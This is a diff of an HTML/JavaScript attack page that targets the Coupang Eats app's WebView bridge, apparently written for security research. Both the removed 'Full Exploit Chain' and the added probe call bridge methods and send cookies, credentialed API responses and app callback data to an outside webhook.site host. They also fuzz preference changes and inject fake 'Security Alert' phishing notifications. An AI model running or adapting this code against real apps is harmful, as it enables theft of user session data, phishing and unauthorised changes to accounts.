@@ -17,250 +17,189 @@ pre{white-space:pre-wrap;word-break:break-all}
 var W="https://webhook.site/a7bc9ca4-1f6a-459e-a5a6-253351c94e4e";
 var o=document.getElementById('o');
 function l(m,c){o.innerHTML+='<span class="'+(c||'')+'">'+(m||'')+'</span>\n';}
- 
+
+function send(tag, data) {
+    try {
+        navigator.sendBeacon(W+'?tag='+tag, JSON.stringify({tag:tag, data:data, time:new Date().toISOString()}));
+    } catch(e){}
+    try {
+        new Image().src=W+'?tag='+tag+'&d='+encodeURIComponent(typeof data==='string'?data:JSON.stringify(data)).substring(0,1500);
+    } catch(e){}
+}
+
 l('═══════════════════════════════════════','y');
-l(' Coupang Eats — Full Exploit Chain','y');
+l(' updateUserPreference Probe','y');
 l('═══════════════════════════════════════','y');
 l('');
- 
-// ═══════════════════════════════════════
-// Capture ALL callback data from the app
-// ═══════════════════════════════════════
-var callbackData = [];
- 
+
+// Track ALL callbacks with their IDs so we know which payload triggered what
+var callbackMap = {};
+
 window.__BRIDGE_CALLBACK = function(raw) {
-    l('[CALLBACK] ← App sent data back:','g');
-    l('  ' + raw, 'g');
-    callbackData.push(raw);
-    sendToWebhook('bridge_callback', raw);
-};
- 
-function sendToWebhook(tag, data) {
-    try {
-        var payload = JSON.stringify({
-            tag: tag,
-            data: data,
-            time: new Date().toISOString()
-        });
-        navigator.sendBeacon(W + '?tag=' + tag, payload);
-    } catch(e){}
-    try {
-        new Image().src = W + '?tag=' + tag + '&d=' + encodeURIComponent(
-            typeof data === 'string' ? data.substring(0,800) : JSON.stringify(data)
-        ).substring(0,1500);
-    } catch(e){}
-}
- 
-// ═══════════════════════════════════════
-// PHASE 1: Detect bridges
-// ═══════════════════════════════════════
-l('[1] Bridge detection','w');
-var mh = (typeof window.messageHandlers !== 'undefined');
-l('  messageHandlers: ' + (mh ? 'YES' : 'NO'), mh ? 'g' : 'r');
- 
-if (mh) {
-    var methods = [];
-    ['parseScheme','schemeAction','close','deviceStatus',
-     'hasAlarmPermission','updateUserPreference','addLocalNotification',
-     'openExternalHTTP','launchApp','gotoStore'].forEach(function(m){
-        try { if(typeof messageHandlers[m]==='function') methods.push(m); } catch(e){}
-    });
-    l('  Methods: ' + methods.join(', '),'c');
-    sendToWebhook('bridges', {available: true, methods: methods});
-}
-l('');
- 
-// ═══════════════════════════════════════
-// PHASE 2: Try openExternalHTTP
-//   This may use OkHttp with auth 
-//   interceptors instead of WebView
-// ═══════════════════════════════════════
-if (mh && typeof messageHandlers.openExternalHTTP === 'function') {
-    setTimeout(function(){
-        l('[2] Trying openExternalHTTP → webhook','y');
-        l('  This may use OkHttp with auth interceptors','w');
-        try {
-            messageHandlers.openExternalHTTP(W + '?tag=openExternalHTTP');
-            l('  [+] Called','g');
-        } catch(e){ l('  [-] ' + e,'r'); }
-    }, 500);
-}
- 
-// ═══════════════════════════════════════
-// PHASE 3: Probe for data via callbacks
-//   deviceStatus returns device/session
-//   info back to our page
-// ═══════════════════════════════════════
-if (mh) {
-    setTimeout(function(){
-        l('');
-        l('[3] Probing app for data via callbacks','y');
-        
-        try {
-            messageHandlers.deviceStatus(JSON.stringify({callbackId:'ds'}));
-            l('  [+] deviceStatus called','g');
-        } catch(e){ l('  [-] deviceStatus: '+e,'r'); }
-        
-        try {
-            messageHandlers.hasAlarmPermission(JSON.stringify({callbackId:'ap'}));
-            l('  [+] hasAlarmPermission called','g');
-        } catch(e){}
-    }, 1500);
-}
- 
-// ═══════════════════════════════════════
-// PHASE 4: Chain through all WebView
-//   routes — each may handle headers 
-//   differently
-// ═══════════════════════════════════════
-if (mh && typeof messageHandlers.parseScheme === 'function') {
+    l('');
+    l('[CALLBACK] ← ' + raw, 'g');
+    send('callback_received', raw);
     
-    // 4a: coupangeats://Web (WebViewActivity)
-    setTimeout(function(){
-        l('');
-        l('[4a] Chain: coupangeats://Web','y');
-        try {
-            messageHandlers.parseScheme(
-                'coupangeats://Web?url=' + encodeURIComponent(W+'?tag=chain_Web')
-            );
-            l('  [+] Fired','g');
-        } catch(e){ l('  [-] '+e,'r'); }
-    }, 3000);
- 
-    // 4b: coupangeats://PopupWebview (another PopupWebView instance)
-    setTimeout(function(){
-        l('[4b] Chain: coupangeats://PopupWebview','y');
-        try {
-            messageHandlers.parseScheme(
-                'coupangeats://PopupWebview?url=' + encodeURIComponent(W+'?tag=chain_Popup')
-            );
-            l('  [+] Fired','g');
-        } catch(e){ l('  [-] '+e,'r'); }
-    }, 5000);
-}
- 
+    // Try to match callback to probe
+    try {
+        var parsed = JSON.parse(raw);
+        if (parsed.type && callbackMap[parsed.type]) {
+            l('[MATCH] Triggered by probe: ' + callbackMap[parsed.type], 'y');
+            send('callback_matched', {probe: callbackMap[parsed.type], response: raw});
+        }
+    } catch(e){}
+};
+
 // ═══════════════════════════════════════
-// PHASE 5: schemeAction (different code 
-//   path — builds JSON, may handle auth
-//   differently)
+// First: Check current marketing push state
+// by calling isMarketingPushEnable
 // ═══════════════════════════════════════
-if (mh && typeof messageHandlers.schemeAction === 'function') {
+l('[Step 1] Probing isMarketingPushEnable state...','w');
+l('');
+
+var checkPayloads = [
+    {type:'isMarketingPushEnable', callbackId:'check_1'},
+    {type:'isMarketingPushEnable'},
+    {action:'isMarketingPushEnable', callbackId:'check_2'},
+    {key:'isMarketingPushEnable', callbackId:'check_3'},
+    {preference:'isMarketingPushEnable', callbackId:'check_4'},
+    {method:'isMarketingPushEnable', callbackId:'check_5'},
+    {name:'isMarketingPushEnable', callbackId:'check_6'},
+    {command:'isMarketingPushEnable', callbackId:'check_7'},
+];
+
+checkPayloads.forEach(function(p, i) {
+    callbackMap['check_'+(i+1)] = JSON.stringify(p);
     setTimeout(function(){
-        l('');
-        l('[5] schemeAction vector','y');
+        var json = JSON.stringify(p);
+        l('[Probe check-' + (i+1) + '] ' + json, 'c');
         try {
-            messageHandlers.schemeAction(JSON.stringify({
-                url: 'coupangeats://Web?url=' + encodeURIComponent(W+'?tag=chain_schemeAction'),
-                callback: '__BRIDGE_CALLBACK'
-            }));
-            l('  [+] Fired','g');
+            messageHandlers.updateUserPreference(json);
+            l('  [+] accepted','g');
+            send('probe_check_'+(i+1), json);
         } catch(e){ l('  [-] '+e,'r'); }
-    }, 7000);
-}
- 
+    }, i * 300);
+});
+
 // ═══════════════════════════════════════
-// PHASE 6: Try forcing WebView to fetch
-//   a Coupang endpoint — the response 
-//   may load in our WebView context
+// Then: Try to ENABLE marketing push
+// (turnOnMarketingPush)
 // ═══════════════════════════════════════
 setTimeout(function(){
     l('');
-    l('[6] XHR probe to Coupang API','y');
-    l('  Checking if WebView has Coupang session cookies...','w');
+    l('[Step 2] Probing turnOnMarketingPush...','w');
+    l('  Trying multiple JSON formats...','w');
+    l('');
+
+    var pushPayloads = [
+        // Format guesses based on common patterns
+        {type:'turnOnMarketingPush', callbackId:'push_1'},
+        {type:'turnOnMarketingPush'},
+        {action:'turnOnMarketingPush', callbackId:'push_2'},
+        {key:'turnOnMarketingPush', callbackId:'push_3'},
+        {preference:'marketing_push', value:true, callbackId:'push_4'},
+        {type:'marketing_push', enabled:true, callbackId:'push_5'},
+        {marketingPush:true, callbackId:'push_6'},
+        {type:'marketingPush', value:true, callbackId:'push_7'},
+        {command:'turnOnMarketingPush', callbackId:'push_8'},
+        {method:'turnOnMarketingPush', callbackId:'push_9'},
+        {name:'turnOnMarketingPush', callbackId:'push_10'},
+        
+        // Korean field names (Coupang is Korean)
+        {type:'마케팅푸시동의', callbackId:'push_kr1'},
+        
+        // Nested format
+        {type:'updatePreference', data:{marketingPush:true}, callbackId:'push_11'},
+        {preference:{type:'marketingPush', enabled:true}, callbackId:'push_12'},
+        
+        // Simple string types
+        {type:'MARKETING_PUSH_ON', callbackId:'push_13'},
+        {type:'marketing_push_on', callbackId:'push_14'},
+    ];
+
+    pushPayloads.forEach(function(p, i) {
+        callbackMap['push_'+(i+1)] = JSON.stringify(p);
+        setTimeout(function(){
+            var json = JSON.stringify(p);
+            l('[Probe push-' + (i+1) + '] ' + json, 'c');
+            try {
+                messageHandlers.updateUserPreference(json);
+                l('  [+] accepted','g');
+                send('probe_push_'+(i+1), json);
+            } catch(e){ l('  [-] '+e,'r'); }
+        }, i * 300);
+    });
+
+}, 3500);
+
+// ═══════════════════════════════════════
+// Also probe deviceStatus more thoroughly
+// to see ALL data the app returns
+// ═══════════════════════════════════════
+setTimeout(function(){
+    l('');
+    l('[Step 3] Deep deviceStatus probe...','w');
     
-    // Try fetching a Coupang API endpoint
-    // If WebView has cookies, this might work
-    var endpoints = [
-        'https://api.coupangeats.com/api/v1/',
-        'https://web.coupangeats.com/api/',
-        'https://gateway.coupangeats.com/'
+    var dsPayloads = [
+        JSON.stringify({callbackId:'ds_full'}),
+        JSON.stringify({type:'deviceStatus', callbackId:'ds_type'}),
+        JSON.stringify({}),
+        '{}',
+        JSON.stringify({callbackId:'ds_all', includeAll:true}),
     ];
     
-    endpoints.forEach(function(ep){
-        try {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', ep, true);
-            xhr.withCredentials = true;
-            xhr.onload = function(){
-                if(xhr.status === 200 || xhr.status === 401 || xhr.status === 403){
-                    l('  [+] ' + ep + ' → ' + xhr.status,'g');
-                    if(xhr.responseText && xhr.responseText.length > 0){
-                        sendToWebhook('xhr_response_' + xhr.status, {
-                            url: ep,
-                            status: xhr.status,
-                            body: xhr.responseText.substring(0,500),
-                            headers: xhr.getAllResponseHeaders()
-                        });
-                        l('  → Response sent to webhook!','g');
-                    }
-                }
-            };
-            xhr.onerror = function(){ /* CORS blocked - expected */ };
-            xhr.send();
-        } catch(e){}
+    dsPayloads.forEach(function(p, i){
+        setTimeout(function(){
+            l('[DS-' + (i+1) + '] ' + p, 'c');
+            try {
+                messageHandlers.deviceStatus(p);
+                l('  [+] sent','g');
+            } catch(e){ l('  [-] '+e,'r'); }
+        }, i * 500);
     });
-    
-    // Also check what cookies the WebView has for current origin
-    l('  Cookies for current origin: ' + (document.cookie || '(none)'),'c');
-    if(document.cookie) sendToWebhook('cookies', document.cookie);
 }, 9000);
- 
+
 // ═══════════════════════════════════════
-// PHASE 7: Notification injection demo
-//   (proves write-access impact)
-// ═══════════════════════════════════════
-if (mh && typeof messageHandlers.addLocalNotification === 'function') {
-    setTimeout(function(){
-        l('');
-        l('[7] Notification injection','y');
-        try {
-            messageHandlers.addLocalNotification(JSON.stringify({
-                title: "Security Alert",
-                body: "Unusual login detected on your account",
-                scheduledTime: Date.now() + 3000
-            }));
-            l('  [+] Phishing notification injected','g');
-            sendToWebhook('notification_injected', 'success');
-        } catch(e){ l('  [-] '+e,'r'); }
-    }, 11000);
-}
- 
-// ═══════════════════════════════════════
-// PHASE 8: Preference modification demo
-//   (proves account manipulation)
-// ═══════════════════════════════════════
-if (mh && typeof messageHandlers.updateUserPreference === 'function') {
-    setTimeout(function(){
-        l('');
-        l('[8] User preference probe','y');
-        try {
-            messageHandlers.updateUserPreference(JSON.stringify({
-                callbackId: 'pref_probe'
-            }));
-            l('  [+] updateUserPreference called','g');
-        } catch(e){ l('  [-] '+e,'r'); }
-    }, 12000);
-}
- 
-// ═══════════════════════════════════════
-// Summary
+// Also try addLocalNotification to
+// prove notification injection
 // ═══════════════════════════════════════
 setTimeout(function(){
     l('');
-    l('═══════════════════════════════════════','y');
-    l(' All phases complete','y');
-    l(' Check webhook.site for results','y');
-    l('═══════════════════════════════════════','y');
+    l('[Step 4] Notification injection test...','w');
+    
+    var notifPayloads = [
+        {title:"Security Alert", body:"Verify your account", callbackId:'notif_1'},
+        {title:"Security Alert", body:"Verify your account", scheduledTime:Date.now()+3000, callbackId:'notif_2'},
+        {type:'addLocalNotification', title:"Test", body:"Notification injection", callbackId:'notif_3'},
+        {pushTitle:"Alert", pushBody:"Test notification", callbackId:'notif_4'},
+        {message:{title:"Alert", body:"Test"}, callbackId:'notif_5'},
+    ];
+    
+    notifPayloads.forEach(function(p, i){
+        setTimeout(function(){
+            var json = JSON.stringify(p);
+            l('[Notif-' + (i+1) + '] ' + json, 'c');
+            try {
+                messageHandlers.addLocalNotification(json);
+                l('  [+] sent','g');
+                send('notif_'+(i+1), json);
+            } catch(e){ l('  [-] '+e,'r'); }
+        }, i * 500);
+    });
+}, 12000);
+
+// Final summary
+setTimeout(function(){
     l('');
-    l('Tags to look for:','w');
-    l('  ?tag=openExternalHTTP  ← may have auth headers','c');
-    l('  ?tag=chain_Web         ← WebViewActivity route','c');
-    l('  ?tag=chain_Popup       ← PopupWebView route','c');
-    l('  ?tag=bridge_callback   ← data from app callbacks','c');
-    l('  ?tag=xhr_response_*    ← API probe results','c');
-    l('  ?tag=cookies           ← WebView cookies','c');
-    l('  ?tag=notification_injected','c');
-}, 14000);
+    l('═══════════════════════════════════════','y');
+    l(' All probes complete.','y');
+    l(' Check webhook.site for:','y');
+    l('  ?tag=callback_received  ← raw app responses','c');
+    l('  ?tag=callback_matched   ← which probe worked','c');
+    l('  ?tag=probe_push_*       ← push preference probes','c');
+    l('  ?tag=notif_*            ← notification probes','c');
+    l('═══════════════════════════════════════','y');
+}, 16000);
 </script>
 </body>
 </html>
